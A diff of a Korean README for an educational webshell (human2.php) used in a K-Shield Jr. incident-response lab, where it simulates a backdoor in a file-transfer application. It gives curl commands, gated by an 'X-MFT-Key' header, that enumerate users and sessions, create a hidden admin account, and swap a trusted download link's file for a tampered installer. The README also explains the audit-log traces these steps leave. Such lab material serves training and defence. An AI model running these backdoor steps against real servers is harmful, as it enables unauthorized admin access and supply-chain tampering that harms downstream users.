@@ -1,4 +1,4 @@
-# ganda-it-webshell
+﻿# ganda-it-webshell
 
 > ganda-it-webshell_human2.php
 
@@ -13,9 +13,7 @@
 * 교육용 관리자 계정 생성
 * 기존 Guest Download 링크가 가리키는 파일 변경
 
----
-
-# 1. 파일 위치
+## 1. 파일 위치
 
 웹 서버에 다음 경로로 배치한다.
 
@@ -31,14 +29,12 @@
 
 따라서 `db.php`가 정상적으로 존재하고 `mft` 데이터베이스에 연결되어 있어야 한다.
 
----
-
-# 2. 인증 방식
+## 2. 인증 방식
 
 모든 요청에는 다음 HTTP 헤더가 필요하다.
 
 ```text
-X-MFT-Key: lemur-demo-key
+X-MFT-Key: execute
 ```
 
 헤더가 없거나 값이 다르면 서버는 `404 Not Found`를 반환한다.
@@ -46,9 +42,7 @@ X-MFT-Key: lemur-demo-key
 기본 요청 예시는 다음과 같다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=users'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
 ```
 
 `mft.local` 대신 실제 실습 서버의 IP 주소 또는 도메인을 사용하면 된다.
@@ -56,16 +50,12 @@ curl \
 예:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://192.168.10.20/human2.php?action=users'
+curl -H 'X-MFT-Key: execute' 'http://192.168.10.20/human2.php?action=users'
 ```
 
----
+## 3. 사용 가능한 기능
 
-# 3. 사용 가능한 기능
-
-## 3.1 파일 목록 확인
+### 3.1 파일 목록 확인
 
 사용 액션:
 
@@ -76,9 +66,7 @@ action=list
 명령:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=list'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
 ```
 
 확인 가능한 정보:
@@ -118,8 +106,6 @@ original_name: installer.exe
 storage_name : f_1004.bin
 ```
 
----
-
 ## 3.2 사용자 목록 확인
 
 사용 액션:
@@ -131,9 +117,7 @@ action=users
 명령:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=users'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
 ```
 
 확인 가능한 정보:
@@ -156,8 +140,6 @@ hospital
 
 비밀번호 해시는 출력하지 않는다.
 
----
-
 ## 3.3 세션 목록 확인
 
 사용 액션:
@@ -169,9 +151,7 @@ action=sessions
 명령:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=sessions'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
 ```
 
 확인 가능한 정보:
@@ -196,8 +176,6 @@ expires_at
 admin
 ```
 
----
-
 ## 3.4 Guest Download 공유 정보 확인
 
 사용 액션:
@@ -209,9 +187,7 @@ action=shares
 명령:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=shares'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
 ```
 
 확인 가능한 정보:
@@ -248,9 +224,7 @@ files.id = 4
 정상 installer.exe
 ```
 
----
-
-# 4. 관리자 계정 생성
+## 4. 관리자 계정 생성
 
 사용 액션:
 
@@ -269,17 +243,13 @@ svc_backup
 명령:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=create_user'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user'
 ```
 
 계정명을 직접 지정할 수도 있다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=create_user&name=svc_backup'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
 ```
 
 생성되는 계정:
@@ -306,11 +276,9 @@ Role     : admin
 
 생성된 계정으로 정상 웹 로그인 기능을 사용할 수 있다.
 
----
+## 5. Guest Download 파일 바꿔치기
 
-# 5. Guest Download 파일 바꿔치기
-
-## 5.1 기능 설명
+### 5.1 기능 설명
 
 사용 액션:
 
@@ -330,16 +298,12 @@ human2.php?action=replace_share
 &file_id=<새로운 파일 ID>
 ```
 
----
-
-## 5.2 정상 상태 확인
+### 5.2 정상 상태 확인
 
 먼저 현재 공유 상태를 확인한다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=shares'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
 ```
 
 초기 상태에서 `installer.exe` 공유 정보는 다음과 같다.
@@ -362,9 +326,7 @@ installer.exe
 f_1004.bin
 ```
 
----
-
-## 5.3 변조 파일 업로드
+### 5.3 변조 파일 업로드
 
 공격자는 `svc_backup` 등의 관리자 계정을 이용해 관리자 페이지에 로그인한 뒤 변조된 `installer.exe`를 업로드한다.
 
@@ -381,9 +343,7 @@ printf 'KSHIELD SUPPLY CHAIN COMPROMISE DEMO\n' > evil-installer.exe
 업로드 후 파일 목록을 다시 확인한다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=list'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
 ```
 
 예를 들어 결과가 다음과 같다고 가정한다.
@@ -407,9 +367,7 @@ file_id 5 = 공격자가 업로드한 변조 파일
 
 이다.
 
----
-
-## 5.4 공유 링크 대상 변경
+### 5.4 공유 링크 대상 변경
 
 정상 Guest Download Token:
 
@@ -426,9 +384,7 @@ file_id = 5
 인 경우 다음 요청을 보낸다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
 ```
 
 성공하면 대략 다음과 같은 JSON 응답이 반환된다.
@@ -451,16 +407,12 @@ curl \
 }
 ```
 
----
-
-## 5.5 변경 결과 확인
+### 5.5 변경 결과 확인
 
 다시 공유 정보를 조회한다.
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=shares'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
 ```
 
 변경 전:
@@ -481,7 +433,7 @@ token    = 동일
 
 즉 다음과 같이 변경된다.
 
-### 변경 전
+#### 변경 전
 
 ```text
 Guest Token
@@ -491,7 +443,7 @@ shares.file_id = 4
 정상 installer.exe
 ```
 
-### 변경 후
+#### 변경 후
 
 ```text
 Guest Token
@@ -509,9 +461,7 @@ shares.file_id = 5
 
 따라서 기존에 이 링크를 전달받은 사용자는 URL 변경을 인지하지 못한다.
 
----
-
-# 6. audit_logs에 남는 흔적
+## 6. audit_logs에 남는 흔적
 
 `replace_share` 기능을 사용하면 `audit_logs` 테이블에 변경 기록이 남는다.
 
@@ -537,16 +487,12 @@ detail     = share file_id changed from 4 to 5
 대상 Guest Download Token
 ```
 
----
+## 7. 전체 공격 시나리오 사용 순서
 
-# 7. 전체 공격 시나리오 사용 순서
-
-## ① 파일 목록 확인
+### ① 파일 목록 확인
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=list'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
 ```
 
 정상 `installer.exe`의 ID를 확인한다.
@@ -557,14 +503,10 @@ curl \
 file_id = 4
 ```
 
----
-
-## ② 사용자 확인
+### ② 사용자 확인
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=users'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
 ```
 
 정상 계정 구조를 확인한다.
@@ -576,38 +518,26 @@ deployer
 hospital
 ```
 
----
-
-## ③ 세션 확인
+### ③ 세션 확인
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=sessions'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
 ```
 
 활성 관리자 세션 등의 정보를 확인한다.
 
----
-
-## ④ 공유 정보 확인
+### ④ 공유 정보 확인
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=shares'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
 ```
 
 정상 배포 파일과 Guest Download Token의 매핑 관계를 확인한다.
 
----
-
-## ⑤ 관리자 계정 생성
+### ⑤ 관리자 계정 생성
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=create_user&name=svc_backup'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
 ```
 
 생성 계정:
@@ -618,9 +548,7 @@ Temp1234!
 admin
 ```
 
----
-
-## ⑥ svc_backup으로 로그인
+### ⑥ svc_backup으로 로그인
 
 웹 서비스의 정상 로그인 페이지에서 다음 계정으로 로그인한다.
 
@@ -631,18 +559,14 @@ Password: Temp1234!
 
 관리자 페이지 접근 여부를 확인한다.
 
----
-
-## ⑦ 변조 installer.exe 업로드
+### ⑦ 변조 installer.exe 업로드
 
 관리자 업로드 기능을 이용해 실습용 변조 파일을 업로드한다.
 
 업로드 후:
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=list'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
 ```
 
 새 파일의 `file_id`를 확인한다.
@@ -653,14 +577,10 @@ curl \
 file_id = 5
 ```
 
----
-
-## ⑧ Guest Download 링크 대상 변경
+### ⑧ Guest Download 링크 대상 변경
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
 ```
 
 결과:
@@ -673,21 +593,15 @@ After
 file_id = 5
 ```
 
----
-
-## ⑨ 공유 상태 재확인
+### ⑨ 공유 상태 재확인
 
 ```bash
-curl \
-  -H 'X-MFT-Key: lemur-demo-key' \
-  'http://mft.local/human2.php?action=shares'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
 ```
 
 동일한 Token이 새로운 `file_id`를 가리키는지 확인한다.
 
----
-
-## ⑩ 기존 Guest Download 링크 접근
+### ⑩ 기존 Guest Download 링크 접근
 
 기존 사용자가 사용하던 동일한 Guest Download URL을 호출한다.
 
@@ -699,44 +613,39 @@ curl \
 
 URL과 Token은 바뀌지 않았지만 실제 다운로드 파일은 공격자가 업로드한 파일로 변경된다.
 
----
-
-# 8. 빠른 명령어 모음
+## 8. 빠른 명령어 모음
 
 ```bash
 # 파일 목록
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=list'
-
-
-# 사용자 목록
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=users'
-
-
-# 세션 목록
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=sessions'
-
-
-# Guest Download 공유 목록
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=shares'
-
-
-# 교육용 관리자 계정 생성
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=create_user&name=svc_backup'
-
-
-# Guest Download 대상 파일 변경
-curl -H 'X-MFT-Key: lemur-demo-key' \
-'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
 ```
 
----
+```bash
+# 사용자 목록
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
+```
 
-# 9. human2.php의 시나리오상 역할
+```bash
+# 세션 목록
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
+```
+
+```bash
+# Guest Download 공유 목록
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
+```
+
+```bash
+# 관리자 계정 생성
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
+```
+
+```bash
+# Guest Download 대상 파일 변경
+curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
+```
+
+## 9. human2.php의 시나리오상 역할
 
 `human2.php`는 SQL Injection 자체를 대체하는 기능이 아니라, 초기 침투 이후 공격자가 MFT 애플리케이션을 지속적으로 제어하기 위해 사용하는 **제한된 애플리케이션 백도어**를 모사한다.
 
@@ -782,9 +691,7 @@ replace_share
 = 공급망 배포 대상 변조
 ```
 
----
-
-# 10. 공급망 변조 핵심
+## 10. 공급망 변조 핵심
 
 이 실습에서 핵심은 파일 이름이나 Guest Download URL 자체를 변경하는 것이 아니다.
 
@@ -814,9 +721,7 @@ file_id 5
 
 즉 신뢰받던 배포 경로는 그대로 유지하면서 내부 참조 관계만 변경하는 방식으로 공급망 침해 상황을 재현한다.
 
----
-
-# 11. 주의사항
+## 11. 주의사항
 
 본 프로그램은 K-Shield Jr. 침해사고 대응 프로젝트를 위한 교육용 코드이다.
 
